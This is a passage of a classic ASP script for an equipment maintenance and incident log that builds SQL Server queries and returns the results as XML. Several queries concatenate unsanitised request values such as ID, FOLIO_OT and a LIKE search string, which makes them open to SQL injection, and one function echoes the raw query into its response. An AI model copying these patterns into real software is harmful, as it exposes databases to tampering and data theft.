	query = query&" ORDER BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,ORDEN "
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>" '& query
	N=0
	While Not ORs.EOF 
			N=N+1
			Response.Write "<ROW>" 
			Response.Write "<N>" & N & "</N>"
			Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
			Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
			Response.Write "<CRITICIDAD>" & ORs.Fields.Item(2).Value & "</CRITICIDAD>" 
			Response.Write "<GCODE>" & ORs.Fields.Item(3).Value & "</GCODE>" 
			Response.Write "<LAYOUT>" & ORs.Fields.Item(4).Value & "</LAYOUT>" 
			if ORs.Fields.Item(5).Value <> "" then
				Response.Write "<X>" & ORs.Fields.Item(5).Value & "</X>" 
			else
				Response.Write "<X>0</X>" 
			end if
			if ORs.Fields.Item(6).Value <> "" then
				Response.Write "<Y>" & ORs.Fields.Item(6).Value & "</Y>" 
			else
				Response.Write "<Y>0</Y>" 
			end if
			Response.Write "<COLOR>" & ORs.Fields.Item(7).Value & "</COLOR>"
			Response.Write "<NIVEL>" & ORs.Fields.Item(10).Value & "</NIVEL>"
			Response.Write "</ROW>"
	  ORs.MoveNext 
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function getLayoutSec()

	query = "SELECT SUBSTRING(E.LAYOUT,0,LEN(E.LAYOUT)-3) AS EQUIPO, DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) AS PRINCIPAL,ISNULL(MAX(B.CRITICIDAD),0),E.GCODE,E.LAYOUT,E.X,E.Y"
	query = query&",COLOR=CASE WHEN ISNULL(MAX(B.CRITICIDAD),0) > 66.7 THEN 'ALTA' WHEN ISNULL(MAX(B.CRITICIDAD),0) > 33.3 THEN 'MEDIA' WHEN ISNULL(MAX(B.CRITICIDAD),0)=0 THEN 'NORMAL' ELSE 'BAJA' END "
	query = query&",Orden=CASE WHEN ISNULL(MAX(B.CRITICIDAD),0) > 66.7 THEN '1' WHEN ISNULL(MAX(B.CRITICIDAD),0) > 33.3 THEN '2' WHEN ISNULL(MAX(B.CRITICIDAD),0)=0 THEN '4' ELSE '3' END,E.SECUENCIA "
	query = query&"FROM EQUIPOS AS E INNER JOIN EQUIPOS_USUARIOS AS EU ON DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION)=EU.EQUIPO AND EU.USUARIO=" & strNvl(USUARIO)
	query = query&" LEFT OUTER JOIN BITACORAS AS B ON E.CODIGO=B.EQUIPO AND E.UBICACION=B.UBICACION AND B.IND_SOLUCION='FALSE'"
'	query = query"& AND (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103),103) BETWEEN '01/01/2012' AND '01/12/2016') "
	query = query&" WHERE  E.COD_EQUIPO_PADRE IS NOT NULL AND E.NIVEL in (1,2,3) AND E.UBICACION=" & strNvl(FAENA)
	query = query&" AND E.ESTADO = 'ACT'"
	query = query&" AND DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION) =" & strNvl(EQUIPO_PRIN)
	query = query&" GROUP BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,E.GCODE,E.LAYOUT,X,Y "
	query = query&" ORDER BY DBO.EquipoPrincipalFaena(E.CODIGO,E.UBICACION),E.SECUENCIA,ORDEN "
		'RESPONSE.WRITE("QUERY: " )
		'RESPONSE.WRITE(query)
		'RESPONSE.End()
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 

		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" & query
	N=0
	'equipoValor = ""'
	While Not ORs.EOF 
		'if ORs.Fields.Item(0).Value <> equipoValor THEN'
			N=N+1
			Response.Write "<ROW>" 
			Response.Write "<N>" & N & "</N>"
			Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
			Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
			Response.Write "<CRITICIDAD>" & ORs.Fields.Item(2).Value & "</CRITICIDAD>" 
			Response.Write "<GCODE>" & ORs.Fields.Item(3).Value & "</GCODE>" 
			Response.Write "<LAYOUT>" & ORs.Fields.Item(4).Value & "</LAYOUT>" 
			if ORs.Fields.Item(5).Value <> "" then
				Response.Write "<X>" & ORs.Fields.Item(5).Value & "</X>" 
			else
				Response.Write "<X>0</X>" 
			end if
			if ORs.Fields.Item(6).Value <> "" then
				Response.Write "<Y>" & ORs.Fields.Item(6).Value & "</Y>" 
			else
				Response.Write "<Y>0</Y>" 
			end if
			Response.Write "<COLOR>" & ORs.Fields.Item(7).Value & "</COLOR>"
			Response.Write "</ROW>"
		'End if'
		'equipoValor = ORs.Fields.Item(0).Value'
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

Function getFiles(Bitacora)

    query = "SELECT (RTRIM(CAST(A.ID AS CHAR)) + '.' + CAST(A.EXT AS CHAR)) AS FILENAME FROM ARCHIVOS AS A "
	query = query & " WHERE A.IDENTIFICADOR = '" & Bitacora & "'" 
	query = query & " AND A.FAMILIA='BITACORAS' and A.EXT<>'pdf'"
	
	Set getFiles =oDB.EjecutaSql(query)

End Function

Function getHistorial(Bitacora)

    query = "SELECT ID, INSPECTOR, FECHA, STATUS, USERDATE, USERNAME "
	query = query & " FROM HISTORIAL_BITACORA AS H "
	query = query & " WHERE ID = " & strNvl(Bitacora) & "" 
	query = query & " ORDER BY FECHA DESC"
	
	Set getHistorial =oDB.EjecutaSql(query)

End Function


Function getChecklist(Id, TipoEquipo)

	query = "SELECT CHK.ID, CHK.DESCRIPCION, CHK_E.BITACORA , CHK_E.VALOR "
	query = query & " FROM CHECKLIST AS CHK "
	query = query & " LEFT OUTER JOIN CHECK_EQUIPOS AS CHK_E ON CHK_E.BITACORA=" & strNvl(Id)
	query = query & " 		AND CHK.ID = CHK_E.CHECKLIST "
	query = query & " WHERE TIPO_EQUIPO=" & TipoEquipo
	query = query & " AND CHK_E.VALOR<>0 "
	query = query & " ORDER BY ID"
	 
	Set getChecklist =oDB.EjecutaSql(query)
	

End Function

Function getDescripciones(Fecha, Faena, Equipo) ' ID, FECHA, B.DESCRIPCION, B.EQUIPO, B.COLOR, B.RECOMENDACION'

	query = "SET DATEFORMAT DMY SELECT B.ID, RTRIM(CONVERT(CHAR,B.FECHA,103)) AS FECHA, B.DESCRIPCION, B.EQUIPO, "
	query = query & "  B.COLOR, B.RECOMENDACION, B.REPORT "
	query = query & "  FROM BITACORAS AS B, EQUIPOS AS E "
	query = query & "  WHERE CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) <= " & strNvl(TERMINO)
	query = query & "  AND B.UBICACION=" & strNvl(Faena)
	query = query & "  AND B.EQUIPO=E.CODIGO "
	query = query & "  AND B.IND_SOLUCION <> 'true' AND B.EQUIPO=" & strNvl(Equipo) 
	query = query & "  GROUP BY B.ID,B.FECHA, B.DESCRIPCION, B.EQUIPO, "
	query = query & "  B.COLOR, B.RECOMENDACION, B.REPORT "
	query = query & "  ORDER BY DBO.EquipoPrincipal(B.EQUIPO), B.EQUIPO"
	 
	Set getDescripciones =oDB.EjecutaSql(query)
	
End Function

function ListEquiposBitacora()

	query = "SELECT DISTINCT EQUIPO"
	query = query & " FROM BITACORAS "
	query = query & " WHERE CONVERT(DATETIME,(CONVERT(CHAR,FECHA,103)),103) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND " & strNvl(FECHA_FIN)
	query = query & " AND UBICACION=" & strNvl(FAENA)
	
	if (EQUIPO)<>"TOD" AND LEN(EQUIPO)>0 Then
	query = query & " AND DBO.EquipoPrincipal(EQUIPO)= " & strNvl(EQUIPO)
	end If
	
	If RESPONSABLE<>"TOD" and LEN(RESPONSABLE)>0 Then
		query = query & " AND RESPONSABLE =" & strNvl(RESPONSABLE)
	End if
	
	If TURNO<>"TOD" and LEN(TURNO)>0 Then
		query = query & " AND TURNO=" & strNvl(TURNO)
	End if
	
	'response.write query
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
		  Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function ListEquiposPrinUsuarioBitacora()

	query = "SELECT DISTINCT RESPONSABLE"
	query = query & " FROM BITACORAS  as B "
	query = query & " WHERE CONVERT(DATETIME,(CONVERT(CHAR,FECHA,103)),103) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND " & strNvl(FECHA_FIN)
	query = query & " AND UBICACION=" & strNvl(FAENA)
	
	if (EQUIPO)<>"TOD" AND LEN(EQUIPO)>0 Then
	query = query & " AND DBO.EquipoPrincipal(B.EQUIPO)= " & strNvl(EQUIPO)
	end If
	
	If EQUIPO_PRIN<>"TOD" AND LEN(EQUIPO_PRIN)>0 Then
		query = query & " AND DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION)=" & strNvl(EQUIPO_PRIN)
		
	ELSE
			If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
			End if
	End if
	
'	If RESPONSABLE<>"TOD" and LEN(RESPONSABLE)>0 Then
'		query = query & " AND RESPONSABLE =" & strNvl(RESPONSABLE)
'	End if
	
	If TURNO<>"TOD" and LEN(TURNO)>0 Then
		query = query & " AND TURNO=" & strNvl(TURNO)
	End if
	
'	response.write query
'	response.end
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(0).Value & "</RESPONSABLE>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function


function InsertCintaBitacora()

	query = "INSERT INTO BITACORA_CINTAS (ID_BITACORA, CINTA) VALUES ("
	query = query & strNvl(ID) & "," & strNvl(CINTA) & ")"
	
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	  Response.Write "<ROW>" 
		  Response.Write "<ID>OK</ID>"
	  Response.Write "</ROW>"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function


function GetCintasBitacora()

	query = "SELECT CINTA FROM BITACORA_CINTAS WHERE ID_BITACORA=" & ID
	
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
		  Response.Write "<CINTA>" & ORs.Fields.Item(0).Value & "</CINTA>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function
		 
function DelCintaBitacora()

	query = "DELETE BITACORA_CINTAS WHERE ID_BITACORA=" & ID
	
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	  Response.Write "<ROW>" 
		  Response.Write "<ID>OK</ID>"
	  Response.Write "</ROW>"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function
		 
function ListIncidentes()

	query = "SELECT	B.ID AS ID, B.FECHA , B.TURNO, B.RESP_INCIDENTE, "
	query = query & "B.DESCRIPCION, B.EQUIPO_INC, B.DESC_EQUIPO, "
	query = query & "B.ESTADO, B.IND_INCIDENTE, B.DIAS, FOLIO_OT "
	query = query & "FROM VI_INCIDENTES_OT AS B, EQUIPOS_USUARIOS AS EU "

	If ESTADO="SIN_OT" Then
		query = query & " WHERE FOLIO_OT IS NULL "
	Else
		query = query & " WHERE FOLIO_OT IS NOT NULL "
	End If
		
	If LEN(EQUIPO)>0 AND EQUIPO<>"TOD" Then
		query = query & " AND  DBO.EquipoPrincipal(B.EQUIPO_INC) =" & strNvl(EQUIPO)
	End If
	
		query = query & " AND  DBO.EquipoPrincipal(B.EQUIPO_INC) = EU.EQUIPO"
		query = query & " AND  EU.USUARIO=" & strNvl(USUARIO)
			
	If LEN(TURNO)>0 AND TURNO<>"TOD" Then
		query = query & " AND  B.TURNO =" & strNvl(TURNO)
	End If
	
	If LEN(RESPONSABLE)>0 AND RESPONSABLE<>"TOD" Then
		query = query & " AND  B.RESP_INCIDENTE =" & strNvl(RESPONSABLE)
	End If
	
	query = query & " ORDER BY B.FECHA, B.TURNO "

	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
   		  Response.Write "<COD_EQUIPO>" & ORs.Fields.Item(5).Value & "</COD_EQUIPO>"
   		  Response.Write "<DESC_EQUIPO>" & ORs.Fields.Item(6).Value & "</DESC_EQUIPO>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(7).Value & "</ESTADO>"
  		  Response.Write "<DIAS>" & ORs.Fields.Item(9).Value & "</DIAS>"
		  Dim IMAGEN
		  If ORs.Fields.Item(10).Value<>"NULL" Then
   		  		IMAGEN = "images\generado.gif"
		  Else
		  		IMAGEN = "images\generar.gif"
		  End If
		  
		  Response.Write "<IMAGE>" & IMAGEN & "</IMAGE>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	'Response.Write "<QUERY>" & query & "</QUERY>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function ListIncidentesOT()

	query = "SELECT ID, B.FECHA, TURNO, RESPONSABLE,"
	query = query & " DESCRIPCION, ESTADO, IND_INCIDENTE "
	query = query & " FROM BITACORAS AS B, INCIDENTES_OT AS IO "
	query = query & " WHERE B.IND_INCIDENTE = 'TRUE'"
	query = query & " AND B.ID = IO.ID_INCIDENTE"
	query = query & " AND IO.FOLIO_OT=" & FOLIO_OT
	query = query & " ORDER BY FECHA"
	
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>" 
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function getPlanData()

	query = "SELECT B.REPORT, B.OT, B.FECHA_PROGRAMADA, RECOMENDACION, ACCION, CONDICION, STATUS "
	query = query & " FROM BITACORAS AS B "
	query = query & " WHERE B.ID = " & strNvl(ID)
	
	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-1'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	If Not ORs.EOF Then
	  Response.Write "<ROWS>" 
		  Response.Write "<REPORT>" & ORs.Fields.Item(0).Value & "</REPORT>"
		  Response.Write "<OT>" & ORs.Fields.Item(1).Value & "</OT>"
		  Response.Write "<FECHA_PROGRAMADA>" & ORs.Fields.Item(2).Value & "</FECHA_PROGRAMADA>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(3).Value & "</RECOMENDACION>"
		  Response.Write "<ACCION>" & ORs.Fields.Item(4).Value & "</ACCION>"
		  Response.Write "<CONDICION>" & ORs.Fields.Item(5).Value & "</CONDICION>"
		  Response.Write "<STATUS>" & ORs.Fields.Item(6).Value & "</STATUS>"
	  Response.Write "</ROWS>"
	End IF
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
	
end function

function GetBitacora()

	query = "SELECT B.ID,"
	query = query & "rtrim(convert(char,b.fecha,103)) + ' ' + "
	query = query & " substring(convert(char,b.fecha,108),1,5) as FECHA,"
	query = query & " B.TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE,"
	query = query & " B.EQUIPO, E.DESCRIPCION AS DESC_EQUIPO,"
	query = query & " B.REPORT, B.CRITICIDAD, B.TIPO_TURNO,  "
	query = query & " B.DANO, B.PRIORIDAD, B.IND_DANO, "
	query = query & " B.COMBUSTIBLE, B.VALOR_COMBUSTIBLE, B.DOC_COMBUSTIBLE,"
	query = query & " B.CAUSA, B.RECOMENDACION, B.COLOR, B.IND_SOLUCION, B.EJECUTOR, "
	query = query & " B.ULT_INSPECCION, B.OT, B.ULT_MOD_OBS, B.OBSERVACION "
	query = query & " FROM BITACORAS AS B LEFT OUTER JOIN EQUIPOS AS E "
	query = query & " ON B.EQUIPO = E.CODIGO"
	query = query & " WHERE ID=" & ID 


	Set ORs =oDB.EjecutaSql(query)
	Response.ContentType = "text/xml"
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	If Not ORs.EOF Then
	  Response.Write "<ROW>" 
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(7).Value & "</EQUIPO>"
   		  Response.Write "<DESC_EQUIPO>" & ORs.Fields.Item(8).Value & "</DESC_EQUIPO>"
   		  Response.Write "<REPORT>" & ORs.Fields.Item(9).Value & "</REPORT>"
  		  Response.Write "<CRITICIDAD>" & ORs.Fields.Item(10).Value & "</CRITICIDAD>"
  		  Response.Write "<TIPO_TURNO>" & ORs.Fields.Item(11).Value & "</TIPO_TURNO>"
   		  Response.Write "<DANO>" & ORs.Fields.Item(12).Value & "</DANO>"
   		  Response.Write "<PRIORIDAD>" & ORs.Fields.Item(13).Value & "</PRIORIDAD>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(14).Value & "</IND_DANO>"
		  Response.Write "<COMBUSTIBLE>" & ORs.Fields.Item(15).Value & "</COMBUSTIBLE>"
		  Response.Write "<VALOR_COMBUSTIBLE>" & ORs.Fields.Item(16).Value & "</VALOR_COMBUSTIBLE>"
		  Response.Write "<DOC_COMBUSTIBLE>" & ORs.Fields.Item(17).Value & "</DOC_COMBUSTIBLE>"
 		  Response.Write "<CAUSA>" & ORs.Fields.Item(18).Value & "</CAUSA>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(19).Value & "</RECOMENDACION>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(20).Value & "</COLOR>"
		  Response.Write "<IND_SOLUCION>" & ORs.Fields.Item(21).Value & "</IND_SOLUCION>"
		  Response.Write "<EJECUTOR>" & ORs.Fields.Item(22).Value & "</EJECUTOR>"
		  Response.Write "<ULT_INSPECCION>" & ORs.Fields.Item(23).Value & "</ULT_INSPECCION>"
		  Response.Write "<OT>" & ORs.Fields.Item(24).Value & "</OT>"
		  Response.Write "<ULT_MOD_OBS>" & ORs.Fields.Item(25).Value & "</ULT_MOD_OBS>"
		  Response.Write "<OBSERVACION>" & ORs.Fields.Item(26).Value & "</OBSERVACION>"
	  Response.Write "</ROW>"
	End If
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function updatePlanData()

	query = "UPDATE BITACORAS SET FECHA_PROGRAMADA =" & strNvl(FECHA_PROGRAMADA)
	query = query & " , REPORT =" & strNvl(REPORT)
	query = query & " , OT="  & strNvl(OT)
	query = query & " , RECOMENDACION="  & strNvl(RECOMENDACION)
	query = query & " , ACCION="  & strNvl(ACCION)
	query = query & " , CONDICION="  & strNvl(CONDICION)
	query = query & " , STATUS="  & strNvl(ESTATUS)
	query = query & " WHERE ID = " & strNvl(ID)
	
	Set ORs =oDB.EjecutaSql(query)
	Response.Write "<?xml version='1.0' encoding='ISO-8859-1'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	  Response.Write "<ROWS>" 
		  Response.Write "<LAYOUT>OK</LAYOUT>"
	  Response.Write "</ROWS>"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
	
end function


function UpdateBitacora()
	CRIT = 0
	query = "SELECT ISNULL(CRITICIDAD,0) FROM BITACORAS WHERE ID=" & ID
	Set ORs1 =oDB.EjecutaSql(query)
	OLD_CRITICIDAD = ORs1.Fields.Item(0).Value
	
	if cdbl(trim(OLD_CRITICIDAD)) < cdbl(trim(CRITICIDAD))  then
			STS = 3
	elseif cdbl(trim(OLD_CRITICIDAD)) = cdbl(trim(CRITICIDAD)) then
			STS = 2
	else
			STS = 1
	end if

	query = "UPDATE BITACORAS SET FECHA = " & strNvl(FECHA) & ","
	query = query & "TURNO=" & strNvl(TURNO) & ","
	query = query & "EJECUTOR=" & strNvl(EJECUTOR) & ","
	query = query & "IND_INCIDENTE=" & strNvl(IND_INCIDENTE) & ","
	query = query & "IND_DANO=" & strNvl(IND_DANO) & ","
	query = query & "EQUIPO=" & strNvl(EQUIPO) & ","
	query = query & "REPORT=" & strNvl(REPORT) & ","
	query = query & "NAVE=" & strNvl(NAVE) & ","
	query = query & "TIPO_TURNO=" & strNvl(TIPO_TURNO) & ","
	query = query & "PRIORIDAD=" & strNvl(PRIORIDAD) & ","
	query = query & "COLOR=" & strNvl(COLOR) & ","
	query = query & "ULT_INSPECCION=" & strNvl(ULT_INSPECCION) & ","
	query = query & "CRITICIDAD=" & strNvl(CRITICIDAD) & ","
	query = query & "COMBUSTIBLE=" & strNvl(COMBUSTIBLE) & ","
	query = query & "VALOR_COMBUSTIBLE=" & strNvl(VALOR_COMBUSTIBLE) & ","
	query = query & "OBSERVACION =" & strNvl(OBSERVACION) & ","
	query = query & "IND_SOLUCION=" & strNvl(IND_SOLUCION) & ","
	query = query & "USERDATE = getdate(),"
	query = query & "USERNAME =" & strNvl(USERNAME) & ","
	query = query & "DANO=" & strNvl(DANO)
	if SW = 1 or SW = 3 then
		query = query & ", ULT_MOD_OBS= getdate() "
	end if
	query = query & " WHERE ID=" & ID 

	Set ORs =oDB.EjecutaSql(query)
	
'		query = "UPDATE BITACORAS SET ULT_INSPECCION = " & strNvl(ULT_INSPECCION) 
'		query = query & " WHERE DBO.EQUIPOPRINCIPAL(EQUIPO)= DBO.EQUIPOPRINCIPAL(" & strNvl(EQUIPO) & ")" 
'		query = query & " AND UBICACION=" & strNvl(FAENA) 
'		query = query & " AND IND_SOLUCION<>'TRUE'"
'		Set ORs =oDB.EjecutaSql(query)
		
		
'		response.write query & "<br>"
'		response.end
		
	IF SW = 2 or SW = 3 or IND_SOLUCION = "TRUE" THEN
		query = "SELECT FECHA, STATUS FROM HISTORIAL_BITACORA "
		query = query & " WHERE ID=" & strNvl(ID) 
		query = query & " AND CONVERT(CHAR,FECHA,103)=CONVERT(CHAR," & strNvl(ULT_INSPECCION) & ",103)" 
		query = query & " AND STATUS = " & strNvl(STS)
	
		Set ORs =oDB.EjecutaSql(query)
		'response.write query & "<br>"
		if IND_SOLUCION = "TRUE" then
			STS = 1
		end if
		If ORs.EOF Then
			query = "SET DATEFORMAT DMY  INSERT INTO HISTORIAL_BITACORA (ID, INSPECTOR, FECHA, STATUS, USERNAME, USERDATE) VALUES ("
			query = query & ID & "," & strNvl(USERNAME) & "," 
			if ULT_INSPECCION <> "" THEN
				query = query & strNvl(ULT_INSPECCION ) 
			ELSE
				query = query & "GETDATE()"
			END IF
			query = query & "," & STS & "," & strNvl(USERNAME) & ", GETDATE())"
			'response.write query & "<br>"

			Set ORs =oDB.EjecutaSql(query) 
			if STS = 3 then
				MailBitacora(STS)
			end if
		End If
	END IF
	'response.write query & "<br>"
	'response.end
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	Response.Write "OK"
	Response.Write "</REGISTROS>"
	
	
	
	Set ORs = Nothing
	Set ODB = Nothing
end function

function UpdateBitacoraDetalles()
	CRIT = 0
	query = "UPDATE BITACORAS SET DESCRIPCION=" & strNvl(DESCRIPCION) & ","
	query = query & "CAUSA=" & strNvl(CAUSA) & ","
	query = query & "RECOMENDACION=" & strNvl(RECOMENDACION) 
	query = query & " WHERE ID=" & ID 

	Set ORs =oDB.EjecutaSql(query)
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	Response.Write "OK"
	Response.Write "</REGISTROS>"
	
	
	
	Set ORs = Nothing
	Set ODB = Nothing
end function


function ListProv()
	query = "SELECT RUT_PROVEEDOR, NOMBRE FROM PROVEEDORES"
	Set ORs =oDB.EjecutaSql(query)
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>"
		  Response.Write "<RUT>" & ORs.Fields.Item(0).Value & "</RUT>"
		  Response.Write "<NOMBRE>" & ORs.Fields.Item(1).Value & "</NOMBRE>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function ListNaves()

	query = "SELECT FLD_COD_NAVE, replace(FLD_DES_NAVE,'&',' ') FROM T_Nave "
	query = query & "WHERE Upper(FLD_DES_NAVE) LIKE '%" & UCASE(STR) & "%'"
	
	Set ORs =oDB.EjecutaSql(query)
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	While Not ORs.EOF 
	  Response.Write "<ROW>"
		  Response.Write "<NOMBRE>" & ORs.Fields.Item(0).Value & "</NOMBRE>"
		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(1).Value & "</DESCRIPCION>"
	  Response.Write "</ROW>"
	  ORs.MoveNext
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ODB = Nothing
end function

function LayoutFaena()
	query = "SELECT DBO.EquipoPrincipal(E.CODIGO) AS EQUIPO, E.SECUENCIA, SUM(ISNULL(T.CRITICIDAD,0)) AS VALOR, "
	query = query & " CASE WHEN (SUM(ISNULL(T.CRITICIDAD,0)) <= 25 AND SUM(ISNULL(T.CRITICIDAD,0)) > 0 ) THEN 'BAJA' "
	query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0)) < 70 AND SUM(ISNULL(T.CRITICIDAD,0)) > 25) THEN 'MEDIA' "
	query = query & " 	   WHEN (SUM(ISNULL(T.CRITICIDAD,0))) >= 70 THEN 'ALTA' "
	query = query & " 	   ELSE 'NORMAL' END AS COLOR "
